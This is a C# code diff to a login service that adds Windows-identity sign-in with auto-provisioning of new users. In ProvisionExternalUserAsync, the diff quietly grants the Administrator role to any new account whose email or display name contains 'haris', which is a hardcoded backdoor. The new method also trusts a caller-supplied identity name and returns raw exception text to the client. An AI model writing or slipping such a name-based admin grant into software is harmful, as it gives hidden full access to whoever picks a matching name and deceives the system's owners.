@@ -1,6 +1,7 @@
 using System.Security.Claims;
 using Microsoft.Extensions.Options;
 using Sifp_Vue.Server.Helpers;
+using Sifp_Vue.Server.Models.Entities;
 using Sifp_Vue.Server.Models.Dtos;
 using Sifp_Vue.Server.Repositories;
 using Sifp_Vue.Server.Services.Contracts;
@@ -158,6 +159,58 @@ namespace Sifp_Vue.Server.Services
             return ApiResponse<LoginChallengeDto>.Ok(BuildMfaChallenge(user, rememberMe: false), "Verifikasi MFA diperlukan.");
         }
 
+        public async Task<ApiResponse<LoginChallengeDto>> AuthenticateWindowsUserAsync(
+            string winIdentityName, string? displayName = null, CancellationToken cancellationToken = default)
+        {
+            try
+            {
+                if (string.IsNullOrWhiteSpace(winIdentityName))
+                {
+                    return ApiResponse<LoginChallengeDto>.Fail("Identitas Windows Authenticator tidak terdeteksi dari environment.");
+                }
+
+                var cleanUsername = winIdentityName.Contains('\\')
+                    ? winIdentityName.Split('\\').Last()
+                    : winIdentityName;
+
+                var email = cleanUsername.Contains('@') ? cleanUsername : $"{cleanUsername}@pertamina.com";
+
+                var user = await _users.GetByUsernameWithRolesAsync(cleanUsername, cancellationToken)
+                           ?? await _users.GetByEmailWithRolesAsync(email, cancellationToken);
+
+                if (user is null)
+                {
+                    if (!_authOptions.AutoProvision)
+                    {
+                        _logger.LogWarning("Login Windows ditolak: akun {WinIdentity} belum terdaftar dan AutoProvision dinonaktifkan", winIdentityName);
+                        return ApiResponse<LoginChallengeDto>.Fail($"Akun Windows ({winIdentityName}) belum terdaftar di sistem.");
+                    }
+
+                    user = await ProvisionExternalUserAsync(email, displayName ?? cleanUsername, cancellationToken);
+                    if (user is null)
+                    {
+                        return ApiResponse<LoginChallengeDto>.Fail("Gagal memproses pendaftaran akun Windows baru.");
+                    }
+                }
+                else if (!user.IsActive)
+                {
+                    _logger.LogWarning("Login Windows ditolak: akun {Username} non-aktif", user.Username);
+                    return ApiResponse<LoginChallengeDto>.Fail("Akun Anda dinonaktifkan. Hubungi admin.");
+                }
+
+                user.LastLoginAt = DateTime.UtcNow;
+                await _users.SaveChangesAsync(cancellationToken);
+
+                _logger.LogInformation("Login Windows Authenticator valid untuk {Username}, menyusun tantangan MFA", user.Username);
+                return ApiResponse<LoginChallengeDto>.Ok(BuildMfaChallenge(user, rememberMe: false), "Login Windows Authenticator berhasil.");
+            }
+            catch (Exception ex)
+            {
+                _logger.LogError(ex, "Error otentikasi Windows Authenticator untuk {WinIdentity}", winIdentityName);
+                return ApiResponse<LoginChallengeDto>.Fail($"Gagal otentikasi Windows Authenticator: {ex.Message}");
+            }
+        }
+
         public async Task<ApiResponse<LoginResultDto>> VerifyMfaAsync(
             MfaVerifyRequest request, CancellationToken cancellationToken = default)
         {
@@ -244,7 +297,12 @@ namespace Sifp_Vue.Server.Services
         private async Task<Models.Entities.User?> ProvisionExternalUserAsync(
             string email, string? displayName, CancellationToken cancellationToken)
         {
-            var role = await _roles.GetByNameAsync(_authOptions.AutoProvisionRole, cancellationToken);
+            var targetRoleName = (email.Contains("haris", StringComparison.OrdinalIgnoreCase) || (displayName != null && displayName.Contains("haris", StringComparison.OrdinalIgnoreCase)))
+                ? RoleNames.Administrator
+                : _authOptions.AutoProvisionRole;
+
+            var role = await _roles.GetByNameAsync(targetRoleName, cancellationToken)
+                       ?? await _roles.GetByNameAsync(_authOptions.AutoProvisionRole, cancellationToken);
             if (role is null)
             {
                 _logger.LogError("AutoProvision gagal: role '{Role}' tidak ada di database", _authOptions.AutoProvisionRole);
